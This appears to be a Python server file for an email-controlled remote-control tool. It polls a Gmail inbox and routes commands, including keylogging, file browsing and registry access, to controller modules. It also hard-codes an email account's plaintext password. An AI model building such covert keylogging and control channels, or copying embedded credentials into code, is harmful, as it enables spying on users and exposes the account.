import time
import json

from sympy import re
from EmailTemplate import EmailTemplate 
from Controls.RegistryControl import RegistryControl 
from Controls.KeyloggerControl import KeyloggerControl
from Controls.FileControl import FileControl

def HandleRequest(request, emailTemplate):
    emailFrom = request["From"]
    try:
        if not request:
            return

        body = json.loads(request["Body"])
        method = body["Method"]
        emailFrom = request["From"]

        if( method != "KEYLOG"
            and method != "SD_LO"
            and method != "LIVESCREEN"
            and method != "APP_PRO"
            and method != "MAC"
            and method != "DIRECTORY"
            and method != "REGISTRY"
            and method != "QUIT"):

            response = {
                "isSuccess": False,
                "message": "No method found with the " + method 
            }
            emailTemplate.SendNotification(emailFrom = emailTemplate.username , emailTo = emailFrom, subject = "[No-reply] Server Response", body = json.dumps(response))
            return 
            
        if(method == "KEYLOG"):
            controller = KeyloggerControl()
            return controller.KeyloggerHandle(emailTemplate, emailFrom)
        if(method == "DIRECTORY"):
            controller = FileControl(emailTemplate, emailFrom)
            return controller.FileHandle()
        if(method == "REGISTRY"):
            controller = RegistryControl(emailTemplate, emailFrom)
            return controller.RegistryHandle()
    except:
        response = {
                "isSuccess": False,
                "message": "Failed to process from the server. Please try one more time."
            }
        emailTemplate.SendNotification(emailFrom = emailTemplate.username , emailTo = emailFrom, subject = "[No-reply] Server Response", body = json.dumps(response))
        return 


if __name__ == "__main__":
    gmail = EmailTemplate("theanh@canhcam.com", "Theanh!23")

    while(1):
        content = gmail.Receive()
        if not content: 
            continue
        data = json.loads(content)
        response = HandleRequest(data, gmail)
        time.sleep(5)


